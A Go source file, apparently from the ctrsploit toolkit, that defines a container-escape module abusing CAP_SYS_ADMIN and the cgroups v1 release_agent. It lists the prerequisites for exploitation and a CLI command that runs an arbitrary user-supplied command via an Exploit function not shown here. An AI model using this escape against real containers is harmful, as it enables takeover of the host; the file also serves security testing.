package release_agent

import (

	"github.com/ctrsploit/ctrsploit/prerequisite/apparmor"
	"github.com/ctrsploit/ctrsploit/prerequisite/capability"
	"github.com/ctrsploit/ctrsploit/prerequisite/cgroups"
	"github.com/ctrsploit/ctrsploit/prerequisite/user"
	"github.com/ctrsploit/sploit-spec/pkg/app"
	"github.com/ctrsploit/sploit-spec/pkg/exeenv"
	"github.com/ctrsploit/sploit-spec/pkg/log"
	"github.com/ctrsploit/sploit-spec/pkg/prerequisite"
	"github.com/ctrsploit/sploit-spec/pkg/vul"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"github.com/urfave/cli/v3"
)

var (
	aliases      = []string{"ra"}
	flagsExploit = []cli.Flag{
		&cli.StringFlag{Name: "cmd", Aliases: []string{"c"}, Required: true},
	}
	CheckSecCmd = app.Vul2ChecksecCmd(&Vul, aliases, nil)
	ExploitCmd  = app.Vul2ExploitCmd(&Vul, aliases, flagsExploit, true)
	VulCmd      = app.Vul2VulCmd(&Vul, aliases, nil, flagsExploit, true)
)

type vulnerability struct {
	vul.BaseVulnerability
}

var (
	Vul = vulnerability{
		BaseVulnerability: vul.BaseVulnerability{
			Name:        "release_agent",
			Description: "escape by cap_sys_admin via cgroups v1 release_agent",
			Level:       vul.LevelHigh,
			ExeEnv: exeenv.ExeEnv{
				Env:     exeenv.InContainer,
				Check:   exeenv.InContainer,
				Exploit: exeenv.InContainer,
			},
			CheckSecPrerequisites: &capability.CapSysAdminBnd,
			ExploitablePrerequisites: prerequisite.And(
				&capability.CapSysAdminEff,
				&user.EUid0,
				&cgroups.V1,
				&cgroups.HasTopLevelSubsystem,
				&apparmor.Disabled,
			),
		},
	}
)

func (v *vulnerability) Exploit(cmd *cli.Command) (err error) {
	err = v.BaseVulnerability.Exploit(cmd)
	if err != nil {
		return
	}
	cmdStr := cmd.String("cmd")
	log.Logger.Debug("cmd: ", cmdStr)
	result, err := Exploit(cmdStr)
	awesome_error.CheckErr(err)
	log.Logger.Infof("result:\n%s", result)
	return
}
